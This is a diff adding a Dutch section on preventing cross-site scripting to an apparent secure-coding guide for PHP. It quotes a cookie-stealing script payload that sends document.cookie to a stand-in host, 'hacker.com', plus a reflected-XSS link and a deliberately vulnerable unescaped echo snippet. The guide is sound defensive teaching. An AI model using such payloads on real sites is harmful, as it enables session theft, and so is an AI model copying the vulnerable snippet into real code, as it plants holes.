@@ -36,6 +36,59 @@ Stel je de database voor als een robot die alleen de SQL-taal begrijpt. Als je g
 
 Aanvallers kunnen login omzeilen, alle database data stelen (gebruikerslijsten, wachtwoord hashes), of zelfs de database verwijderen.
 
+### 【Cross-Site Scripting (XSS) Aanvallen Voorkomen】
+
+**Waarom is dit belangrijk?**
+
+Als je website is zoals een spiegel die gebruikersinvoer direct weerkaatst, dan kunnen gebruikers kwaadaardige JavaScript scripts in de inhoud inbouwen. Wanneer andere gebruikers deze inhoud bekijken, wordt het kwaadaardige script uitgevoerd in hun browsers, waardoor hun informatie wordt gestolen. HTML entiteit codering converteert speciale karakters in kwaadaardige scripts (zoals `<`, `>`) naar onschadelijke platte tekst, waardoor ze niet uitvoerbaar zijn.
+
+**Hacker Scenario 😈**
+> Ik liet een reactie achter in de reactiesectie van je artikel: `<script>fetch('https://hacker.com/steal?cookie=' + document.cookie)</script>`. Deze tekst werd opgeslagen in de database zoals het was. Nu zal elke gebruiker die deze reactie leest automatisch dit script laten uitvoeren door hun browser, waardoor hun login cookies naar mijn server worden gestuurd. Met de cookies kan ik hun identiteit nadoen om in te loggen op de website.
+
+**Geavanceerde Aanvalsmethode: Hoe Kan Code van Gebruiker A de Data van Gebruiker B Stelen?**
+
+Veel mensen vragen zich af: "De aanvaller heeft mijn website niet gewijzigd, dus hoe kan hij de data van andere gebruikers stelen?" Laat me het uitleggen met een compleet voorbeeld:
+
+1. **Aanvaller A creëert een kwaadaardige link**
+   ```
+   https://yoursite.com/detail.php?id=1<script>steal()</script>
+   ```
+
+2. **Aanvaller misleidt slachtoffer B door social engineering**
+   - Email: "Bekijk het fantastische werk van deze fotograaf!"
+   - Social media posts, forum reacties, etc.
+
+3. **Wat gebeurt er wanneer slachtoffer B op de link klikt?**
+   ```php
+   // Jouw code (kwetsbaar)
+   <meta property="og:url" content="<?php echo $_SERVER['REQUEST_URI']; ?>">
+   
+   // Werkelijke output naar B's browser
+   <meta property="og:url" content="/detail.php?id=1<script>steal()</script>">
+   ```
+
+4. **Waarom kunnen ze B's data stelen?**
+   - B is al ingelogd op jouw website
+   - Het kwaadaardige script draait onder **jouw domein**, dus het kan:
+     - B's cookies lezen (login credentials)
+     - Toegang krijgen tot B's localStorage
+     - Verzoeken doen namens B
+     - Pagina-inhoud wijzigen (bijv: nep login formulieren)
+
+**Eenvoudige Analogie**
+Stel je voor dat jouw website een bank is:
+- Aanvaller A plaatst een "nep opnamebewijs" (kwaadaardig script) in de banklobby
+- Klant B denkt dat het legitiem is en voert zijn wachtwoord in
+- A krijgt B's wachtwoord
+
+XSS stelt aanvallers in staat om "nep opnamebewijzen" (kwaadaardige code) te plaatsen in jouw "banklobby" (website).
+
+Daarom moet je `htmlspecialchars()` gebruiken - het zorgt ervoor dat alle gebruikersinvoer wordt weergegeven als platte tekst, niet als uitvoerbare code.
+
+**Catastrofale Gevolgen 💥**
+
+Massale diefstal van gebruikersaccounts, lekkage van persoonlijke data, websites geïnfiltreerd met phishing inhoud of mining scripts.
+
 ---
 
 ## 🔐 Rechten en Authenticatie
